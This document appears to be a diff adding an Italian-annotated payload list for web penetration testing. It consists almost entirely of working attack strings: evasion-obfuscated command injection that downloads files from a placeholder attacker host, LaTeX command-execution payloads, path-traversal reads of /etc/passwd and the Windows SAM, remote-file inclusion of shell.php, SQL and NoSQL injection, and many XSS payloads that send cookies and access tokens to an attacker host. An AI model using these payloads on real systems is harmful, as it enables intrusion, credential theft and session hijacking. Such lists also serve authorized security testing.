@@ -1,0 +1,266 @@
+
+==> Comandi Linux / windows:
+dir
+ping -c 1 <ATTACKER-IP>
+ping -n 1 <ATTACKER-IP>
+ping+-c+1+<ATTACKER-IP>
+ping+-n+1+<ATTACKER-IP>
+wget http://<ATTACKER-IP>/HereWeAre
+wget+http://<ATTACKER-IP>/HereWeAre
+Invoke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
+curl -o hello.html http://<ATTACKER_IP>/HereWeAre
+Invoke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
+curl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+
+
+/usr/bin/who?mi
+p?ing -c 1 <ATTACKER-IP>
+p?ing -n 1 <ATTACKER-IP>
+p?ng+-c+1+<ATTACKER-IP>
+p?ng+-n+1+<ATTACKER-IP>
+/usr/bin/wg?t http://<ATTACKER-IP>/HereWeAre
+/usr/bin/wg?t+http://<ATTACKER-IP>/HereWeAre
+Invo?ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
+cur?l -o hello.html http://<ATTACKER_IP>/HereWeAre
+
+/usr/bin/who*mi
+whoami
+p*ng+-c+1+<ATTACKER-IP>
+p*ng+-n+1+<ATTACKER-IP>
+p*ing -c 1 <ATTACKER-IP>
+p*ing -n 1 <ATTACKER-IP>
+/usr/bin/wg*t http://<ATTACKER-IP>/HereWeAre
+/usr/bin/wg*t+http://<ATTACKER-IP>/HereWeAre
+Invo*ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
+cur*l+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+
+w'h'o'a'mi
+p''i'n'g+-c+1+<ATTACKER-IP>
+p''i'n'g -c 1 <ATTACKER-IP>
+w''g''et http://<ATTACKER-IP>/HereWeAre
+w''g''et+http://<ATTACKER-IP>/HereWeAre
+In''voke-Web''Request -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
+cu''rl -o hello.html http://<ATTACKER_IP>/HereWeAre
+In''voke-Web''Request+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
+cu''rl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+
+
+w\ho\ami
+p\i\ng+-c+1+<ATTACKER-IP>
+p\i\ng -c 1 <ATTACKER-IP>
+wg\et http://<ATTACKER-IP>/HereWeAre
+wg\et+http://<ATTACKER-IP>/HereWeAre
+Invo\ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
+cu\rl -o hello.html http://<ATTACKER_IP>/HereWeAre
+Invo\ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
+cu\rl+-o+hello.html http://<ATTACKER_IP>/HereWeAre
+
+
+w$@hoami
+Pin$@g+-c+1+<ATTACKER-IP>
+pin$@g -c 1 <ATTACKER-IP>
+wg$@et http://<ATTACKER-IP>/HereWeAre
+wg$@et+http://<ATTACKER-IP>/HereWeAre
+Invo$@ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
+cu$@rl -o hello.html http://<ATTACKER_IP>/HereWeAre
+Invo$@ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
+cu$@rl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+
+
+== UTF-8 Encoding
+%EF%BC%86 whoami
+%EF%BC%86%EF%BC%86 whoami
+%EF%BD%9C whoami
+%EF%BD%9C%EF%BD%9C whoami
+
+
+==> LATEX
+== Latex: Read File
+\input{/etc/passwd}
+\lstinputlisting{/etc/passwd}
+\verbatiminput{/etc/passwd}
+
+== Latex: Write file
+\newwrite\outfile
+\openout\outfile=cmd.tex
+\write\outfile{Hello-world}
+\closeout\outfile
+
+== Latex: Command execution
+\immediate\write18{env > output}
+\input{output}
+\input{|"/bin/hostname"}
+\input{|"extractbb /etc/passwd > /tmp/b.tex"}
+\immediate\write18{env | base64 > test.tex}
+\input{text.tex}
+\input|ls|base4
+\input{|"/bin/hostname"}
+
+
+
+==> LFI
+== Check Win
+/../../../../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../../../../windows/system32/drivers/etc/hosts
+C:\Windows\System32\config\SAM
+<iframe src=C:\Windows\System32\config\SAM heigh=500 width=500></iframe>
+
+== Check Linux
+/etc/passwd
+../../../../../../../../etc/passwd
+file:///etc/passwd
+file://etc/passwd
+<iframe src=/etc/passwd height=500 width=500></iframe>
+<iframe src=/etc/passwd+height=500+width=500></iframe>
+
+== Tipici file php da intercettare nella home page
+php://filter/convert.base64-encode/resource=index
+php://filter/convert.base64-encode/resource=login
+php://filter/convert.base64-encode/resource=home
+php://filter/convert.base64-encode/resource=main
+php://filter/convert.base64-encode/resource=default
+php://filter/convert.base64-encode/resource=welcome
+php://filter/convert.base64-encode/resource=frontpage
+php://filter/convert.base64-encode/resource=landing
+php://filter/convert.base64-encode/resource=start
+php://filter/convert.base64-encode/resource=root
+php://filter/convert.base64-encode/resource=entrance
+php://filter/convert.base64-encode/resource=config
+php://filter/convert.base64-encode/resource=upload
+
+== Null byte (../../../../etc/passwd%00 viene realizzato con lo script python quindi non lo aggiungo alla lista)
+
+== Double encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+== UTF-8 encoding
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd
+%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc..%2fpasswd
+
+== Path and dot truncation
+../../../etc/passwd.................................
+../../../etc/passwd\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.
+../../../etc/passwd/./././././././././././././././././././././././. 
+
+== Filter bypass tricks
+....//....//....//....//....//....//....//....//....//....//etc/passwd
+..///////..////..//////..///////..////..//////..///////..////..//////..///////..////..//////etc/passwd
+/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+
+
+==>  RFI
+http://<ATTACKER-IP>/shell.php
+== UTF-8 encoding
+http:%2f/%2FATTACKER_IP>%2fshell.php
+== Double encoding
+http:%252f%252f<ATTACKER-IP>%252fshell.php
+
+== Attivazione RFI via FTP
+ftp://<ATTACKER-IP>/shell.php
+== UTF-8 encoding
+ftp:%2f/%2FATTACKER_IP>%2fshell.php
+== Double encoding
+ftp:%252f%252f<ATTACKER-IP>%252fshell.php
+
+== Attivazione RFI via SMB
+\\<ATTACKER-IP>\shell.php
+
+
+==> SQL-injection:
+'
+'-- -
+')-- -
+")-- -
+)'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+
+'-SLEEP(30); #
+
+
+== UTF-8 encoding
+%EF%BC%87 or %EF%BC%87 1 %EF%BC%87 = %EF%BC%87 1
+%EF%BC%82 or %EF%BC%82 1 %EF%BC%82 = %EF%BC%82 1
+admin'  %EF%B9%A3 %EF%B9%A3%EF%B9%A3
+
+==> SQL-injection con JSON
+"
+/"
+
+==> NoSQL-injection
+{"username":{"$ne":null},"password":{"$ne":null}}
+== UTF-8 encoding
+{%EF%BC%82username%EF%BC%82:{%EF%BC%82$ne%EF%BC%82:null},%EF%BC%82password%EF%BC%82:{%EF%BC%82$ne%EF%BC%82:null}}
+
+
+
+==> SSRF
+ping 127.0.0.1
+== UTF-8 encoding
+ping %E2%91%A0%E2%91%A1%E2%91%A6.%E2%93%AA.%E2%93%AA.%E2%91%A0
+ 
+
+==> XSS injection
+<script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script>
+<ScRIpt>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</scrIPt>
+<script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script><script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script>
+<u/onmouseover="var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)";//>hello
+<img src=x onerror=""var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)""//
+<scr<script>ipt>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</scr</script>ipt>
+<script>var x;x=localStorage.getItem('access_token'); document.location.replace('http://<ATTACKER-IP>/c=2&cc='+x)</script>
+<script>document.location='http://<ATTACKER-IP>/?c=3&cc='+btoa(document.cookie)</script>
+<script>document.location='http://<ATTACKER-IP>/?c=4&cc='+btoa(localStorage.getItem('access_token'))</script>
+<img style="display: none;" src=x onerror="fetch('http://<ATTACKER-IP>/?c=6&cc='+btoa(document.cookie))">
+<iframe style="display:none" src=javascript:void(document.location="http://<ATTACKER-IP>/?c=7&cc='+document.cookie)></iframe>
+"><script> var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=8&cc='+x)</script>
+<sCriPt> var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=9&cc='+x)</scRIpT>
+<script x> var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=10&cc='+x)</script>
+<scr<script>ipt> var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=11&cc='+x)</scr<script>ipt>
+<script> var x;x=\u0064ocument.\u0063ookie; \u0064ocument.location.replace('http://<ATTACKER-IP>/c=12&cc='+x)</script>
+<img style="display: none;" src=x oneonerrorrror="fetch('http://<ATTACKER-IP>/?c=13&cc='+btoa(document.cookie))">
+"><img style="display: none;" src=x onerror="fetch('http://<ATTACKER-IP>/?c=14&cc='+btoa(document.cookie))">
+<svg onload="fetch('http://<ATTACKER-IP>/?c=15&cc='+btoa(document.cookie))">
+<svg onload="fetch('http://<ATTACKER-IP>/?c=16&cc='+btoa(\u0064ocument.cookie))">
+<svg onlonloadoad="fetch('http://<ATTACKER-IP>/?c=17&cc='+btoa(document.cookie))">
+"><svg onload="fetch('http://<ATTACKER-IP>/?c=18&cc='+btoa(document.cookie))">
+<div onpointerover="fetch('http://<ATTACKER-IP>/?c=19&cc='+btoa(document.cookie))">MOVE HERE</div>
+<div onpointerover="fetch('http://<ATTACKER-IP>/?c=20&cc='+btoa(\u0064ocument.cookie))">MOVE HERE</div>
+"><div onpointerover="fetch('http://<ATTACKER-IP>/?c=21&cc='+btoa(document.cookie))">MOVE HERE</div>
+<div onpoonpointeroverinterover="fetch('http://<ATTACKER-IP>/?c=22&cc='+btoa(document.cookie))">MOVE HERE</div>
+<body onload="fetch('http://<ATTACKER-IP>/?c=23&cc='+btoa(document.cookie))">
+<body onload="fetch('http://<ATTACKER-IP>/?c=24&cc='+btoa(\u0064ocument.cookie))">
+"><body onload="fetch('http://<ATTACKER-IP>/?c=25&cc='+btoa(document.cookie))"> 
+<body ononloadload="fetch('http://<ATTACKER-IP>/?c=26&cc='+btoa(document.cookie))">
+
+
+
+
+== UTF-8 encoding
+%EF%BC%9Cscript%EF%BC%9Ealert('xss');%EF%BC%9C/script%EF%BC%9E
+
+
+==> SSTI
+${{<%[%'"}}%\.
+{7*7}
+{{7*7}}
+{{7*'7'}}
+${7*7}
+${{7*7}}
+#{7*7}
+a{*comment*}b
+${“z”.join(“ab”)}
+<%= 7*7 %>
+@(2+2)
+==UTF-8
+%EF%B9%9B 3*3 %EF%B9%9C
+%EF%BC%BB 3*3 %EF%BC%BD
+%EF%B9%9B%EF%B9%9B 3*3 %EF%B9%9C%EF%B9%9C
+%EF%BC%BB%EF%BC%BB 3*3 %EF%BC%BD%EF%BC%BD
